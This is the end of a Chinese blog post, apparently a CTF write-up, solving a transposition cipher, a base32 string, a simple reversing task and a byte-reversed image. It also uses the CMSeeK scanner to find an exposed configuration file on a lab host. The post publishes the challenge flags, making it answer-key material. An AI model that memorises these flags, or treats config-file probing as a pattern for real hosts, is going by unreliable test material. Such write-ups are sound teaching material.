+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;snkeegt fhstetr Iedsabs tnaktrt otessha iiriwis tethees&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">k=<span class="string">&#x27;howarey&#x27;</span></span><br><span class="line">kk=<span class="built_in">sorted</span>(k)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(c[kk.index(j)][i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)) <span class="keyword">for</span> j <span class="keyword">in</span> k))</span><br><span class="line"><span class="comment"># Itisofteninthedarkestskiesthatweseebrighteststars</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="这是啥呀"><a href="#这是啥呀" class="headerlink" title="这是啥呀"></a>这是啥呀</h1><p>base32编码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo MZWGCZ33MM4GENJVHBRDSNJUGAYTSOBVGZTDAYRQGIZTINLEMMZTSNJVHBRX2=== | base32 -d</span><br><span class="line"><span class="meta">#</span><span class="bash">flag&#123;c8b558b954019856f0b02345dc39558c&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Windows逆向"><a href="#Windows逆向" class="headerlink" title="Windows逆向"></a>Windows逆向</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;&#39;sKfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&#39;</span><br><span class="line">flag&#x3D;&#39;&#39;</span><br><span class="line">idx&#x3D;[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]</span><br><span class="line">for i in idx:</span><br><span class="line">     flag+&#x3D;s[i]</span><br><span class="line">print(flag)</span><br><span class="line"># KEY&#123;e2s6ry3r5s8f6</span><br></pre></td></tr></table></figure>
+
+<p>得到部分flag，加上1024}得到完整flag：KEY{e2s6ry3r5s8f61024}</p>
+<h1 id="reverseme"><a href="#reverseme" class="headerlink" title="reverseme"></a>reverseme</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;open(&#x27;file.png&#x27;,&#x27;wb&#x27;).write(open(&#x27;reverseme&#x27;,&#x27;rb&#x27;).read()[::-1])&quot;</span></span><br><span class="line">或</span><br><span class="line">&lt;reverseme xxd -p -c1 | tac | xxd -p -r &gt;file.png</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1537420090085.png" alt="1537420090085"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert -flop file.png mirror_file.png</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1537420103233.png" alt="1537420103233"></p>
+<h1 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h1><p><a target="_blank" rel="noopener" href="https://github.com/Tuhinshubhra/CMSeeK">CMSeeK</a> 扫出配置文件 <a target="_blank" rel="noopener" href="http://192.168.200.202//configuration.php.txt">http://192.168.200.202//configuration.php.txt</a> </p>
+<p>底部有flag: <code>flag&#123;0b58f603ff55c0c190502b44b4ffbf2c&#125;</code>  </p>
+<p>此外一些没进一步利用上的信息和部分题目的附件放在<a target="_blank" rel="noopener" href="https://github.com/findneo/ctfgodown/blob/master/20180916heidun/">GiIthub</a> ，有兴趣可移步查看。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/180903-pwnhub-lhy/" rel="prev" title="胖哈勃之 LHY">
+      <i class="fa fa-chevron-left"></i> 胖哈勃之 LHY
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180929-picoctf/" rel="next" title="picoCTF-2018 解题报告">
+      picoCTF-2018 解题报告 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">1.</span> <span class="nav-text">信息泄露+代码审计</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="nav-number">2.</span> <span class="nav-text">最好的语言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#the-user-is-admin"><span class="nav-number">3.</span> <span class="nav-text">the user is admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ccgs"><span class="nav-number">4.</span> <span class="nav-text">ccgs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">注入日志分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#brightstar"><span class="nav-number">6.</span> <span class="nav-text">brightstar</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E5%95%A5%E5%91%80"><span class="nav-number">7.</span> <span class="nav-text">这是啥呀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows%E9%80%86%E5%90%91"><span class="nav-number">8.</span> <span class="nav-text">Windows逆向</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reverseme"><span class="nav-number">9.</span> <span class="nav-text">reverseme</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8B%E5%8D%88"><span class="nav-number">10.</span> <span class="nav-text">下午</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="findneo"
+      src="/images/findneo.png">
+  <p class="site-author-name" itemprop="name">findneo</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/findneo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;findneo" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/findneo_" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;findneo_" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
